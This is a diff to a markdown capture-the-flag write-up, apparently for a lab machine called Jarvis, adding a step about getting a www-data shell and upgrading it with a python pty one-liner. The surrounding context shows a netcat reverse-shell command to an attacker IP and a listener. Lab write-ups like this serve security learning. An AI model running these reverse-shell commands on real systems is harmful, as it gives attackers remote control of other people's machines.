@@ -137,5 +137,10 @@ ________________________________________________________________________________
 
 ``nc -e /bin/bash 10.10.14.50 1337`` and your terminal ``nc -nlvp 1337``
 
-![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/RCE.png) 
+![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/RCE.png)
+
+#### We've got shell www-data. I used the python to spawn tty shell
+``python -c 'import pty;pty.spawn("/bin/bash")'``
+
+![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/shell.png)
 
